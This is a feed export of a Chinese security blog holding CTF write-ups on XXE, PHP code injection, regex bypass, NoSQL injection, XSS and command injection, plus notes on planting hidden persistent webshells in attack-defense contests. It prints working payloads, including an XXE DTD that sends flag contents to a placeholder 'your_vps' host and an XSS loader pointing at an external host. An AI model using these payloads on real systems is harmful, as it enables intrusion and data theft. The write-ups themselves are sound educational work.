这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;%send;%test;%back;]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下：</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>用Curl发送请求，–cookie指定请求cookie参数</p><pre><code>curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</code></pre><p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p><p>其中：</p><ul><li>外部实体send引入外部DTD声明</li><li>参数实体test即为“中间参数实体”</li><li>&#37;为了避免编码问题</li><li>base64-encode是防止文件内容有空格导致http传输时被截断</li></ul><h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><h2 id="关于FUZZ"><a href="#关于FUZZ" class="headerlink" title="关于FUZZ"></a>关于FUZZ</h2><p>关于服务端接收请求，如果已经有lnmp的环境最好。没有的话，这里推荐两个项目：</p><ol><li><p>TheTwitchy:<a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p></li><li><p>docker快速搭建lnmp+ssh(自己的项目求start:):</p></li></ol><p><a href="https://github.com/Hpd0ger/docker-lnmp" target="_blank" rel="noopener">https://github.com/Hpd0ger/docker-lnmp</a></p><h2 id="关于XXE漏洞挖掘"><a href="#关于XXE漏洞挖掘" class="headerlink" title="关于XXE漏洞挖掘"></a>关于XXE漏洞挖掘</h2><p>XML作为介质传输流程应该是这样的：</p><p>用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断</p><p>漏洞点就在后端解析xml。</p><p>当后端使用<strong>loadXML()</strong>的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。</p><p>在挖掘漏洞的时候尤其注意两点：</p><ol><li>content-type: application/xml</li><li>xml形式的数据传输e.g:<code>&lt;user&gt;admin&lt;/user&gt;</code></li></ol><h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol><li><p>对于PHP，禁止引用外部实体</p><pre><code>libxml_disable_entity_loader(true);</code></pre></li><li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从两道CTF题目学习XXE漏洞&quot;&gt;&lt;a href=&quot;#从两道CTF题目学习XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;从两道CTF题目学习XXE漏洞&quot;&gt;&lt;/a&gt;从两道CTF题目学习XXE漏洞&lt;/h1&gt;&lt;p&gt;接触安全到现在，一直没有碰xxe相关
      
    
    </summary>
    
    
      <category term="XXE" scheme="https://hpdoger.cn/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>Code-Breaking-Puzzles WriteUp</title>
    <link href="https://hpdoger.cn/2018/12/21/Code-Breaking-Puzzles%20WriteUp/"/>
    <id>https://hpdoger.cn/2018/12/21/Code-Breaking-Puzzles WriteUp/</id>
    <published>2018-12-20T16:00:00.000Z</published>
    <updated>2019-01-08T03:12:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Code-Breaking-Puzzles-WriteUp"><a href="#Code-Breaking-Puzzles-WriteUp" class="headerlink" title="Code-Breaking-Puzzles WriteUp"></a>Code-Breaking-Puzzles WriteUp</h1><p>最近终于可以忙里偷闲来做一下P神的题目，真的能学到不少东西，对底层的一些漏洞知识学习很有帮助。感谢网上已经有好多版本的wp可以提供参考，有一些知识实在是盲区。写一些笔记，不笱求与师傅们观点相异，如果能让看文章的人更能理解这些洞点，也算是我的荣幸了。</p><h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><p>不得不说P神的代码简洁又暴力</p><pre><code>&lt;?php$action = $_GET[&#39;action&#39;] ?? &#39;&#39;;$arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;;if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {    show_source(__FILE__);} else {    $action(&#39;&#39;, $arg);}</code></pre><p>这里??是php7+的用法，<strong>$_GET[‘action’]非空则 $action = $_GET[‘action’]</strong></p><p>应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。</p><p>P神小密圈说到的方式用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”&quot;。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\think\db”。虽然很无感命名空间的说法，但是感觉和java里的package类似</p><p>接着就是调用Create_function函数来代码注入了，具体原理参考：<a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">http://blog.51cto.com/lovexm/1743442</a></p><p>直接上Poc:<br><code>action=create_function&amp;arg=;}print_r(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));//</code></p><p>别忘了注释//，否则逃脱不了函数</p><h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><pre><code>&lt;?phpfunction is_php($data){    return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);}if(empty($_FILES)) {    die(show_source(__FILE__));}$user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);$data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);if (is_php($data)) {    echo &quot;bad request&quot;;} else {    @mkdir($user_dir, 0755);    $path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;;    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path);    header(&quot;Location: $path&quot;, true, 303);} </code></pre><h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><p>又是一段粗暴的代码。逻辑很清晰：上传文件-&gt;检测是否包含php语句-&gt;否-&gt;跳转到上传的文件</p><p>很明显应该是preg_match的洞点，但是当时并不知道具体突破的思路，看了一些文章才知道，原来php用的是PCRE库的。那么什么是PCRE和NFA正则引擎？</p><h2 id="PCRE"><a href="#PCRE" class="headerlink" title="PCRE"></a>PCRE</h2><p>PCRE(Perl Compatible Regular Expressions中文含义：perl语言兼容正则表达式)是一个用C语言编写的正则表达式函数库</p><p>NFA引擎</p><pre><code>**NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态**</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。就拿这段正则语句来说</p><pre><code>preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data)</code></pre><p>如果我们输入<code>&lt;?php print;abcd</code></p><p>那么它匹配的流程应该是这样的：<br><code>&lt;?php print;abc</code><br><code>&lt;?php print;ab</code><br><code>&lt;?php print;a</code><br><code>&lt;?php print;</code><br><code>&lt;?php print;abcd</code></p><p><strong>.*</strong>会把?后的所有字符都先匹配到，发现没有[]里面的这些字符后再进行回溯。但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制</p><p>引用kk师傅的一张图：<br><img src="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/3.png" alt></p><p>5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>既然是弱类型比较，我们就用false来等价null绕过</p><pre><code>&lt;?php$f = fopen(&quot;poc.txt&quot;, &quot;w&quot;);$msg = &quot;&lt;?php print_r(scandir(&#39;../&#39;));?&gt;&quot;.str_repeat(&quot;A&quot;,1000000);fwrite($f,$msg);fclose($f);</code></pre><p>构造个上传表单完事</p><p>这也提醒我们,正确使用preg_match的重要性，用强类型等于避免很多不安全因素</p><h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>这个题真的发现很多知识碎片</p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>首先聊聊filter的妙用。以前见到的情况和套路都是include()、file_get_contents()的参数可控，我们用php://filter/read配合base64-encode可以把文件编码成base64后输出。没想到file_put_contents文件名可控时也有magic</p><p>当我们可控的文件名$file传入参数<code>php://filter/write=convert.base64-decode/resource=shell.php</code>，$text传入<code>this is test</code>时，file_put_contents($file,$text)执行的内容如下：<br><img src="https://s1.ax1x.com/2018/12/24/F6Hv60.png" alt></p><p>可以把写入的文本进行base64编码，而且可以指定写入的文件名<code>shell.php</code>。其实这个用处还挺多的，比如将可控文本Base64编码，用伪协议写入文件的时候再decode，就能绕过<strong>后端正则对可控文本php危险语句检测</strong>的过滤</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>关键代码<br><img src="https://s1.ax1x.com/2018/12/24/F6bp0U.png" alt></p><p>$output会被转义后输入到可控文本，用上面的思路在写入文本的时候base64-decode就能绕过，注意用Host拼接$log_name。</p><p>至于绕过后缀名，这两天做工程实践的时候恰好用到了p师傅关于apache的x0a后缀解析为php的文件上传绕过，具体思路：<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a><br><img src="https://s1.ax1x.com/2018/12/24/F6bE11.png" alt></p><p>poc如下<br><img src="https://s1.ax1x.com/2018/12/24/F6b97F.png" alt></p><h1 id="php-limit"><a href="#php-limit" class="headerlink" title="php limit"></a>php limit</h1><p>这道题依然简单粗暴，代码如下</p><pre><code>&lt;?phpif(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {        eval($_GET[&#39;code&#39;]);} else {    show_source(__FILE__);}</code></pre><p>刚开始不清楚正则里(?R)的用法，看了别人的WP才知道这是PCRE的正则递归。在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，看下面这个例子<br><img src="https://i.loli.net/2019/01/08/5c3412a2631a6.jpg" alt></p><p>在匹配完b()之后，由于匹配不到[^\W]，正则就停止了。所以这里的代码执行点就是：嵌套函数且最后一个函数不能用参数值</p><p>有的师傅们用了get_defined_vars()获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用getallheaders()来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过current()、next()进而选择可控参数,poc如下</p><p><img src="https://i.loli.net/2019/01/08/5c3413c0a9be1.png" alt></p><h1 id="Nodejs魔法"><a href="#Nodejs魔法" class="headerlink" title="Nodejs魔法"></a>Nodejs魔法</h1><p>Koa框架写的登陆页面，入库的语句都写出来了<br><img src="https://i.loli.net/2018/12/02/5c033d7cc5c7a.png" alt></p><p>看到这一步很关键，因为忘了看flag在哪个表里，后面浪费了很多时间</p><p>继续看到登陆的逻辑<br><img src="https://i.loli.net/2018/12/02/5c033d7ce1b2e.png" alt><br>传入的username&amp;&amp;password非空，并且经过safe函数过滤后带入查询，如果有结果则设定session为查询结果</p><p>##分析<br>一开始绕safe就饶了好久,尝试了各种注释。最后l0cal师傅提醒，在js里toUpperCase()是可以用拉丁文的unicode绕过的，例如<code>&quot;ſ&quot;.toUpperCase()&lt;=&gt;&quot;S&quot;</code>和<code>&quot;ı&quot;.toUpperCase()&lt;=&gt;&quot;I&quot;</code></p><p>那么select 和 union 都可以绕过</p><p>一开始想多了,一直在盲注,根据时候有session判断查询的真假，结果好多东西都绕不过去，而且没看代码还在傻乎乎的测表名，十分愚蠢</p><p>有好多语句都会500，估计是云服务做了限制。。到最后发现把用户名和密码置空，后面用union查询flag，那设置的session不就是flag么。。</p><p>真的是太菜了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Code-Breaking-Puzzles-WriteUp&quot;&gt;&lt;a href=&quot;#Code-Breaking-Puzzles-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;Code-Breaking-Puzzles WriteUp&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF2018 Write up</title>
    <link href="https://hpdoger.cn/2018/12/20/SWPUCTF2018%20Write%20up/"/>
    <id>https://hpdoger.cn/2018/12/20/SWPUCTF2018 Write up/</id>
    <published>2018-12-19T16:00:00.000Z</published>
    <updated>2019-01-17T06:48:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>恰逢复习期，也没什么事，打一场SWPUCTF来放松一下，感谢西油出题师傅。最后狗了个第十二名，顺便吐槽一下队友起的什么智障名字。。<br><img src="https://i.loli.net/2018/12/20/5c1b02a394512.png" alt></p><h1 id="SWPUCTF2018"><a href="#SWPUCTF2018" class="headerlink" title="SWPUCTF2018"></a>SWPUCTF2018</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PCAP"><a href="#PCAP" class="headerlink" title="PCAP"></a>PCAP</h2><p>签到题，流量包拖wireshark追TCP包</p><h2 id="床前明月光-低头…"><a href="#床前明月光-低头…" class="headerlink" title="床前明月光,低头…"></a>床前明月光,低头…</h2><p>低头看键盘</p><pre><code>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</code></pre><p>键盘密码 99就代表9那列的第二个值</p><p>look ….. 依次读就行了</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="用优惠码买个X"><a href="#用优惠码买个X" class="headerlink" title="用优惠码买个X"></a>用优惠码买个X</h2><p>拿到题目扫目录 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br>源码如下</p><pre><code>$_SESSION[&#39;seed&#39;]=rand(0,999999999);function youhuima(){    mt_srand($_SESSION[&#39;seed&#39;]);    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;    $auth=&#39;&#39;;    $len=15;    for ( $i = 0; $i &lt; $len; $i++ ){        if($i&lt;=($len/2))              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);        else              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);    }    setcookie(&#39;Auth&#39;, $auth);}//support    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){        if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){               //执行命令        }else {              //flag字段和某些字符被过滤!        }    }else{             // 你的输入不正确!    }?&gt;</code></pre><p>根据提示应该分两部分  绕过优惠码-&gt;命令执行逃过</p><p>首先说破解优惠码，登陆时session产生0-99999999随机数为种子，通过mt_srand()种下随机数种子，mt_rand()来获取这个随机数。</p><p>这里mt_srand伪随机，具体机制可以看这篇文章：<a href="http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF</a></p><p>种子不变，生成的随机数就不变</p><p>所以通过前15位随机数，破解种子，根据种子再生成24位的随机数，也就是我们的优惠码</p><p>脚本跑随机数在字符串的位置：</p><pre><code>&lt;?php$str = &quot;lP9DUJjQ&quot;;$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;for($i=0;$i&lt;strlen($str);$i++){   $pos = strpos($randStr,$str[$i]);   echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;   //整理成方便 php_mt_seed 测试的格式  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]}echo &quot;\n&quot;;?&gt;</code></pre><p>这个的坑点，必须跑前八位优惠码，因为算法里后起位和前八位生成顺序不一样</p><p>用工具php_mt_seed跑一下<br><img src="https://i.loli.net/2018/12/20/5c1af5f2cb05b.png" alt></p><p>本地php7环境跑这个种子的24位就能得到优惠码了</p><p>优惠码成功跳转到命令执行whois查询，匹配ip时用了/m  且^ $必须匹配头尾，%0a换行绕过检测，0a后面写规范ip</p><p>过滤了查询flag的语句，用”” 或者\绕过都行</p><p>完整payload:</p><pre><code>ca\t /f\lag%0a127.0.0.1</code></pre><h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><p>扫目录用个info.php</p><p>是个phpinfo然后拓展显示mongo的数据库，搭配题目叫注入，那应该是一个nosql注入了</p><p>思路很简单，用通配符猜解admin的密码</p><pre><code>username=admin&amp;password[$regex]=^**</code></pre><p>只不过要写个脚本跑验证码，这里队友写了一个提供参考</p><pre><code>import requestsimport timeimport pytesseractfrom PIL import Imageimport osfrom urllib.request import urlretrievej=0passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun{}&amp;vertify={}&quot;img_url = &#39;http://123.206.213.66:45678/vertify.php&#39;for i in range(1,20):    while j&lt;len(payload):        s = requests.session()        payloads = payload[j]        with open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;,&#39;wb&#39;) as fd:            img_1 = s.get(url=img_url)            fd.write(img_1.content)        image = Image.open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;)        vcode = pytesseract.image_to_string(image)        url_1 = url.format(str(payloads),vcode)        r = s.get(url_1,cookies=img_1.cookies)        print(r.text)        if &quot;wrong CAPTCHA!&quot; in r.text:            continue        if &quot;username or password incorrect!&quot; in r.text:            print(payloads)            j = j+1            break        if &quot;Nice!But it is not the real passwd&quot; in r.text:            passw0rd.append(payloads)            print(&quot;passw0rd is :&quot; + str(passw0rd))            j = j+1            break</code></pre><h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>题目地址：</p><p>file有个代码高亮的功能，把这些页面的额源码都Down一下</p><p>先看一下test类的__get()方法<br><img src="https://i.loli.net/2019/01/17/5c4024d7a5bbf.png" alt><br><img src="https://i.loli.net/2019/01/17/5c4024d7a663a.png" alt></p><p>__get()方法用于输出一个不可访问变量的值，<strong>不可访问不仅仅是protected和private，还有不存在的变量也属于不可访问，这点很重要</strong>。$key的值就是不可访问的参数名，这里是”source”，如果输入”xx”，echo的就是xx。</p><p>开发角度来讲，私有属性一般都会调用__get()方法用以提供外界访问。继续看下面的代码</p><pre><code>    public function get($key)    {        if(isset($this-&gt;params[$key])) {            $value = $this-&gt;params[$key];              } else {            $value = &quot;index.php&quot;;        }        return $this-&gt;file_get($value);      }    public function file_get($value)    {        $text = base64_encode(file_get_contents($value));        return $text;    }</code></pre><p>通过调用get()方法获取params数组里的值，进而获取这个值所对应的文件内容，这为获取flag文件内容做了铺垫。</p><p>所以只需要想办法使$this-&gt;params[$key] =  ‘/var/www/html/f1ag.php’</p><h3 id="瓶颈"><a href="#瓶颈" class="headerlink" title="瓶颈"></a>瓶颈</h3><p>一开始我是这样构造的攻击链：<br><img src="https://i.loli.net/2018/12/20/5c1b0f967a20a.png" alt></p><p>之前分析过phar，它在反序列化的时候不会执行构造函数即construct，所以置空参数，让test类的get方法返回文件内容，再通过c1e4r类的echo输出到页面上</p><p>但是这里有一个问题，phar序列化的时候， 不会把类的方法反序列化，所以只能控类的成员。那么就开始下面的方法：</p><h3 id="正确的思路"><a href="#正确的思路" class="headerlink" title="正确的思路"></a>正确的思路</h3><pre><code>$a = new Test();$a-&gt;params = [    &#39;source&#39; =&gt; &#39;/var/www/html/f1ag.php&#39;];$b = new Show();$b-&gt;str[&#39;str&#39;] = $a;$c = new C1e4r();$c-&gt;str = $b;</code></pre><p>思路就是：<br>我们用test类来获取f1ag.php里的内容，返回给$content(Show类)，$content的值再返回给C1e4r类的echo输出</p><p>C1e4r调用echo，而echo可以执行toString方法，所以我们让echo的值为我们要控的toString方法对应的类即show类的对象</p><h2 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h2><p>网站功能很少：提交邮箱地址-&gt;管理审核邮箱</p><p>给了hint:</p><pre><code>&lt;!--check.phpif($_POST[&#39;email&#39;]) {$email = $_POST[&#39;email&#39;];if(!filter_var($email,FILTER_VALIDATE_EMAIL)){echo &quot;error email, pleduase check your email&quot;;}else{echo &quot;等待管理员自动审核&quot;;edit/5c1a5a3a38649f668227c9fdecho $email;}}?&gt;--&gt;</code></pre><p>之前有个红日审计项目，关于filter_var()匹配email的漏洞进行了剖析:<a href="https://xz.aliyun.com/t/2501" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501</a></p><p>大致就是单引号双引号重叠，用\可以绕过空格，</p><p>然后我尝试了一下注入scirpt标签提交..尼玛直接成功了…<br><img src="https://i.loli.net/2018/12/20/5c1af8b853c84.jpg" alt></p><pre><code>email=&quot;\ &lt;sCRiPt\ sRC=https://unazizi.exeye.io/swctf&gt;&lt;/sCrIpT&gt;\ &quot;@aa.com</code></pre><p>那它的意思应该是后台管理员会随时点击这个email，就触发了xss</p><p>因为打不到管理员的cookie，就打admin.php的页面源码了<br><img src="https://i.loli.net/2018/12/20/5c1af977078cf.jpg" alt></p><p>发现后台会跳到：<code>/admin/a0a.php?cmd=whoami</code></p><p>明显RCE，直接请求到这个url，发现出题人设置了本地，且匹配IP用的是 remote_addr，也就是说无法伪装IP</p><p>后台Bot一直会请求admin.php这个页面，xss 改变它请求的参数，让本地管理员帮我们执行这个命令</p><p>用XHR发送请求或者Location重定向都可以</p><p>反弹Shell后发现还有题目，后台有个上传页面和备份页面，其中backup.php可读内容如下</p><pre><code>&lt;?phpinclude(&quot;upload.php&quot;);echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;$sys = &quot;tar -czf z.tar.gz *&quot;;chdir($upload_dir);system($sys);if(file_exists(&#39;z.tar.gz&#39;)){        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;        echo &quot;备份文件名: z.tar.gz&quot;;}else{        echo &quot;未上传文件，无法备份！&quot;;}?&gt;</code></pre><p>也就是说它会备份我们上传目录下的所有文件，即*</p><p>上传一些文件名例如<code>| echo &quot;123&quot;&gt;123.php</code></p><p>System 就会执行拼接后的$sys</p><p>当时题目坏了，出题师傅跟我说直接再弹一个shell，就可以拿到flag权限。。</p><p>然后直接给我了flag…2333…</p><h1 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h1><p>这次比赛是西南石油师傅举办的公益性比赛..觉得他们确实挺不容易的，学院不支持+自掏腰包办比赛，但是赛题质量都还不错，可见师傅们的用心，给个好评！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;恰逢复习期，也没什么事，打一场SWPUCTF来放松一下，感谢西油出题师傅。最后狗了个第十二名，顺便吐槽一下队友起的什么智障名字。。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2018/12/20/5c1b02a394512.png&quot; alt&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018线下赛感想</title>
    <link href="https://hpdoger.cn/2018/12/17/HCTF2018%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%84%9F%E6%83%B3/"/>
    <id>https://hpdoger.cn/2018/12/17/HCTF2018线下赛感想/</id>
    <published>2018-12-16T16:00:00.000Z</published>
    <updated>2018-12-17T14:00:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>跑去丢了一趟人，实在是对不起各位师傅</p><h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>比赛期恰逢考试期，几天一共就睡了几个小时，无论从体力或是经验都输的一塌糊涂。</p><p>这次比赛也算是给自己个教训，<strong>准备不充分</strong>，就把之前备好的流量成功监控了，其余的东西几乎没用</p><p>比赛开始配置网络用了挺长时间的，导致登上ssh以后就已经被别人上马了。</p><p>其实这是很吃亏的事：第一，你无法及时备份原始的目录，这就有一个很严重的后果，如果后来一不小心恢复了留有马子的备份一切功亏一篑，更严重的是，如果你的一些服务被恶意删了，那开局就直接崩盘。</p><p>第二，在你杀别人后门的时候，别人可能就已经打了你一轮，甚至可能会种新的马。而且杀后门的时间又占用了补洞的时间..新一轮的马子又会上来…</p><p>所以上线一定要快，备份打的一定要快！</p><p>教训就是，一定要在本地补好洞了，再传到机器上，宁可被打，也要修好自己的服务，被打总比down掉了好。这次吃了很大的亏，全场被check。</p><p>所以，不要随便就删漏洞点，有时候漏洞点也是功能点。补洞不代表无脑卡权限，这次include的文件包含洞就可以换成file_get_contents来补。<strong>最重要的事，不要随便就把目录555了</strong>，如果Check点是上传和下载功能就凉了</p><p>关于防御，<strong>一定要给自己留一个可用的后门</strong>,www-data权限一定得有一个，否则php进程可能都杀不掉</p><h1 id="这次比赛后要准备的东西"><a href="#这次比赛后要准备的东西" class="headerlink" title="这次比赛后要准备的东西"></a>这次比赛后要准备的东西</h1><p>吃足了教训：<strong>手动上马是非常愚蠢的行为</strong></p><h2 id="内置后门批量上马"><a href="#内置后门批量上马" class="headerlink" title="内置后门批量上马"></a>内置后门批量上马</h2><p>蓝莲花的moxiaoxi师傅的脚本思路大致是这样的：</p><p>内置后门(能执行system函数)，通过散列生成随机名字的隐藏不死马+守护进程维护不死马+软连接来隐藏真实的请求</p><p>最近要完成这个脚本</p><h2 id="心态"><a href="#心态" class="headerlink" title="心态"></a>心态</h2><p>心态真的是很重要，不要因为被打就慌张，找到洞点，补好了再上服务，切忌慌里慌张。</p><p>这次就算是交学费了，自闭</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;跑去丢了一趟人，实在是对不起各位师傅&lt;/p&gt;
&lt;h1 id=&quot;反思&quot;&gt;&lt;a href=&quot;#反思&quot; class=&quot;headerlink&quot; title=&quot;反思&quot;&gt;&lt;/a&gt;反思&lt;/h1&gt;&lt;p&gt;比赛期恰逢考试期，几天一共就睡了几个小时，无论从体力或是经验都输的一塌糊涂。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="博客文章" scheme="https://hpdoger.cn/tags/%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>RootkitXSS之ServiceWorker</title>
    <link href="https://hpdoger.cn/2018/11/14/RootkitXSS%D6%AEServiceWorker/"/>
    <id>https://hpdoger.cn/2018/11/14/RootkitXSS֮ServiceWorker/</id>
    <published>2018-11-13T16:00:00.000Z</published>
    <updated>2018-11-14T01:42:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RootkitXSS之ServiceWorker"><a href="#RootkitXSS之ServiceWorker" class="headerlink" title="RootkitXSS之ServiceWorker"></a>RootkitXSS之ServiceWorker</h1><p>文章首发于先知：<a href="https://xz.aliyun.com/t/3228#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/3228#toc-10</a></p><p>在拿到一个可以XSS点的时候后，持久化成为一种问题。这几天跟师傅们接触到RootkiXss的一些姿势，受益匪浅</p><h2 id="Serviceworker定义"><a href="#Serviceworker定义" class="headerlink" title="Serviceworker定义"></a>Serviceworker定义</h2><p>Service workers(后文称SW) 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。</p><p>也就是说SW 提供了一组API，能够拦截当前站点产生HTTP请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当Cache Storage不存在请求的资源时再向服务器请求,cache.put可以选择性地将请求资源加载到cache storage中。如果不手动取消已经注册过的sw服务,刷新/重新打开页面都会启动站点的sw服务，这为我们持久化XSS提供了一定的条件。</p><h3 id="查看SW服务"><a href="#查看SW服务" class="headerlink" title="查看SW服务"></a>查看SW服务</h3><p>Chrome地址栏访问 chrome://serviceworker-internals/，就可以看见已有的后台服务。</p><h2 id="注册serviceworker"><a href="#注册serviceworker" class="headerlink" 